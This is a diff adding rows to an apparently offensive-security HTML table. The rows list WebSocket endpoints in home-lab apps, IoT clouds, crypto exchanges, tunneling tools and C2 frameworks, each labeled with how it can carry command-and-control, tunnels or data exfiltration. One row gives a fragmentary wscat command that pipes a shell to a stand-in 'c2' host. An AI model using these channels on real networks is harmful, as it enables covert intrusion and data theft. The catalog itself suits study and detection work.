+            <td class="endpoint-cell"><code>wss://{host}:8080/api</code></td>
+            <td class="abuse-cell">Realtime API over WS <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Uptime Kuma</td>
+            <td class="endpoint-cell"><code>wss://{host}:3001/socket.io/</code></td>
+            <td class="abuse-cell">Status push over WS; widely exposed <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Grafana (Live)</td>
+            <td class="endpoint-cell"><code>wss://{host}/api/live/ws</code></td>
+            <td class="abuse-cell">Live push + data source abuse <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Netdata</td>
+            <td class="endpoint-cell"><code>wss://{host}:19999</code></td>
+            <td class="abuse-cell">Metrics/alarms over WS <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Sonarr/Radarr/Lidarr/Readarr/Prowlarr/Bazarr</td>
+            <td class="endpoint-cell">SignalR <code>wss://{host}/signalr</code></td>
+            <td class="abuse-cell">*Arr app control channels <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Overseerr/Jellyseerr</td>
+            <td class="endpoint-cell"><code>wss://{host}/socket.io/</code></td>
+            <td class="abuse-cell">Media request app pivot <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Tautulli</td>
+            <td class="endpoint-cell"><code>wss://{host}:8181</code></td>
+            <td class="abuse-cell">Plex monitor pivot <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Jellyfin / Emby</td>
+            <td class="endpoint-cell"><code>wss://{host}:8096/socket</code></td>
+            <td class="abuse-cell">Media server WS API <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Kodi</td>
+            <td class="endpoint-cell"><code>ws://{host}:9090/jsonrpc</code></td>
+            <td class="abuse-cell">JSON-RPC control <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Plex</td>
+            <td class="endpoint-cell"><code>wss://app.plex.tv</code>, local <code>wss://{host}:32400/websockets/notifications</code></td>
+            <td class="abuse-cell">Server control channel <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Immich</td>
+            <td class="endpoint-cell"><code>wss://{host}/api/socket.io/</code></td>
+            <td class="abuse-cell">Photo app WS <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Paperless-ngx / Ghostfolio</td>
+            <td class="endpoint-cell">status WS</td>
+            <td class="abuse-cell">Doc/finance app pivots <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Vaultwarden</td>
+            <td class="endpoint-cell"><code>wss://{host}/notifications/hub</code></td>
+            <td class="abuse-cell">Sync hub (SignalR) <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Bitwarden</td>
+            <td class="endpoint-cell"><code>wss://notifications.bitwarden.net/hub</code></td>
+            <td class="abuse-cell">Cloud sync hub <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-unofficial">Unofficial</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Home Assistant</td>
+            <td class="endpoint-cell"><code>wss://{host}:8123/api/websocket</code></td>
+            <td class="abuse-cell">Full HA control = smart-home C2; often exposed <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Homebridge</td>
+            <td class="endpoint-cell">UI WS</td>
+            <td class="abuse-cell">Same model <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Domoticz</td>
+            <td class="endpoint-cell">WS API</td>
+            <td class="abuse-cell">Home automation pivot <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Node-RED</td>
+            <td class="endpoint-cell"><code>wss://{host}:1880/comms</code> (+ editor)</td>
+            <td class="abuse-cell">Flow editor = code execution <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Loxone Miniserver</td>
+            <td class="endpoint-cell"><code>wss://{host}</code></td>
+            <td class="abuse-cell">Building automation control <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">UniFi Network Controller</td>
+            <td class="endpoint-cell"><code>wss://{host}:8443/wss/...</code></td>
+            <td class="abuse-cell">Network gear control over WS <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">OctoPrint</td>
+            <td class="endpoint-cell"><code>wss://{host}:5000</code> (sockjs)</td>
+            <td class="abuse-cell">3D printer host = RPi foothold <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Moonraker (Klipper)</td>
+            <td class="endpoint-cell"><code>wss://{host}:7125/websocket</code></td>
+            <td class="abuse-cell">Printer API over WS <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Duet3D / Mainsail</td>
+            <td class="endpoint-cell"><code>wss://{host}</code></td>
+            <td class="abuse-cell">Printer control channel <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Public MQTT brokers over WS (EMQX <code>wss://broker.emqx.io:8084/mqtt</code>, HiveMQ <code>wss://broker.hivemq.com:8884/mqtt</code>, Mosquitto test <code>ws://test.mosquitto.org:8081</code>)</td>
+            <td class="endpoint-cell"><code>/mqtt</code> paths</td>
+            <td class="abuse-cell">Anonymous pub/sub = classic exfil rendezvous <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Adafruit IO</td>
+            <td class="endpoint-cell"><code>wss://io.adafruit.com</code></td>
+            <td class="abuse-cell">Free IoT cloud pub/sub with API key <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">ThingSpeak / Blynk / Particle / Arduino IoT</td>
+            <td class="endpoint-cell"><code>wss://</code> feeds</td>
+            <td class="abuse-cell">IoT cloud channels as exfil <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Binance</td>
+            <td class="endpoint-cell"><code>wss://stream.binance.com:9443/ws</code></td>
+            <td class="abuse-cell">Subscribe to book/ticker as covert carrier <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Coinbase Exchange</td>
+            <td class="endpoint-cell"><code>wss://ws-feed.exchange.coinbase.com</code></td>
+            <td class="abuse-cell">Same <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Kraken</td>
+            <td class="endpoint-cell"><code>wss://ws.kraken.com</code></td>
+            <td class="abuse-cell">Same <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">OKX / Bybit / Bitstamp / Bitfinex / Gemini / Crypto.com / KuCoin</td>
+            <td class="endpoint-cell"><code>wss://ws.*</code></td>
+            <td class="abuse-cell">Same model across exchanges <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">TradingView</td>
+            <td class="endpoint-cell"><code>wss://data.tradingview.com</code></td>
+            <td class="abuse-cell">Charting socket as carrier <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-unofficial">Unofficial</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Polygon.io / Finnhub / Intrinio / OANDA</td>
+            <td class="endpoint-cell"><code>wss://socket.*</code></td>
+            <td class="abuse-cell">Financial WS APIs as camouflage <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">wstunnel</td>
+            <td class="endpoint-cell"><code>wss://</code></td>
+            <td class="abuse-cell">TCP/UDP tunnel over WS <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">wssocks</td>
+            <td class="endpoint-cell"><code>wss://</code></td>
+            <td class="abuse-cell">SOCKS5 proxy over WS <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">gost</td>
+            <td class="endpoint-cell">websocket transport</td>
+            <td class="abuse-cell">Multi-protocol tunneling <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">frp</td>
+            <td class="endpoint-cell"><code>transport.protocol=websocket</code></td>
+            <td class="abuse-cell">Reverse proxy with WS transport <span class="dir-tag">(EXT→INT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">websockify</td>
+            <td class="endpoint-cell"><code>wss://</code></td>
+            <td class="abuse-cell">Bridge any internal TCP service to the web <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">ngrok</td>
+            <td class="endpoint-cell"><code>wss://*.ngrok.io</code>, <code>*.ngrok-free.app</code></td>
+            <td class="abuse-cell">Instant public WS endpoints <span class="dir-tag">(EXT→INT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Cloudflare Tunnel (cloudflared)</td>
+            <td class="endpoint-cell">HTTPS/WS to CF edge</td>
+            <td class="abuse-cell">Free inbound tunnels incl. WS <span class="dir-tag">(EXT→INT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Tailscale DERP relays</td>
+            <td class="endpoint-cell"><code>wss://derp.tailscale.com</code></td>
+            <td class="abuse-cell">Encrypted relay egress (insider with tailnet access) <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Tor Snowflake</td>
+            <td class="endpoint-cell">WebSocket (turbotunnel)</td>
+            <td class="abuse-cell">Pluggable transport riding volunteer WS proxies <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">(Footnote) chisel, rathole, bore</td>
+            <td class="endpoint-cell">*not* WS</td>
+            <td class="abuse-cell">Frequently confused with WS tunnels — chisel is HTTP-based, rathole uses Noise <span class="dir-tag">(—)</span></td>
+            <td><span class="status-badge status-note">Note</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Mythic</td>
+            <td class="endpoint-cell"></td>
+            <td class="abuse-cell">WebSocket C2 profiles (agents over <code>wss://</code>); MQTT-over-WebSocket profile (Tyche browser agent) <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Sliver</td>
+            <td class="endpoint-cell"></td>
+            <td class="abuse-cell">Community WSS listeners/implants <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Cobalt Strike</td>
+            <td class="endpoint-cell"></td>
+            <td class="abuse-cell">External C2 + community WebSocket beacon bridges (Aggressor scripts) <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">DeimosC2</td>
+            <td class="endpoint-cell"></td>
+            <td class="abuse-cell">WebSocket API comms (deprecated, known XSS CVE-2025-26244) <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Pupy</td>
+            <td class="endpoint-cell"></td>
+            <td class="abuse-cell"><code>ws</code> transport option <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Browser-based agents (Mythic Tyche, XSS→WSS C2)</td>
+            <td class="endpoint-cell"></td>
+            <td class="abuse-cell">Injected JS opens <code>wss://</code> from victim browser <span class="dir-tag">(EXT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell"><code>wscat</code> (npm)</td>
+            <td class="endpoint-cell"></td>
+            <td class="abuse-cell">Pipe interactive shell through WS: `wscat -c wss://c2 \\ <span class="dir-tag">(cmd`)</span></td>
+            <td><span class="status-badge status-note">INT</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell"><code>websocat</code></td>
+            <td class="endpoint-cell"></td>
+            <td class="abuse-cell">Universal WS client: stdin/stdout relay, socks proxy chains <span class="dir-tag">(INT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Python <code>websockets</code> / <code>websocket-client</code></td>
+            <td class="endpoint-cell"></td>
+            <td class="abuse-cell">One-liner C2 beacons <span class="dir-tag">(INT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Node.js <code>ws</code></td>
+            <td class="endpoint-cell"></td>
+            <td class="abuse-cell">Same <span class="dir-tag">(INT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">PowerShell <code>System.Net.WebSockets.ClientWebSocket</code></td>
+            <td class="endpoint-cell"></td>
+            <td class="abuse-cell">Fileless C2 in-memory <span class="dir-tag">(INT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">curl ≥8.10 (experimental <code>--ws</code>)</td>
+            <td class="endpoint-cell"></td>
+            <td class="abuse-cell">Scriptable WS from LOLBin <span class="dir-tag">(INT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Any modern browser</td>
+            <td class="endpoint-cell"></td>
+            <td class="abuse-cell">Injected page/tab opens persistent <code>wss://</code>; user-side exfil without malware <span class="dir-tag">(INT)</span></td>
+            <td><span class="status-badge status-documented">Documented</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">SocketsBay</td>
+            <td class="endpoint-cell"><code>wss://socketsbay.com/*</code></td>
+            <td class="abuse-cell">Free public WebSocket test/echo channels; usable as an anonymous relay or dead drop <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-poc">PoC</span></td>
+        </tr>
+        <tr>
+            <td class="name-cell">Yjs</td>
+            <td class="endpoint-cell"><code>wss://demos.yjs.dev/*</code></td>
+            <td class="abuse-cell">Public CRDT sync demo server; shared document "rooms" usable as a low-bandwidth covert channel <span class="dir-tag">(INT→EXT)</span></td>
+            <td><span class="status-badge status-concept">Concept</span></td>
+        </tr>
     </tbody>
 </table>
 
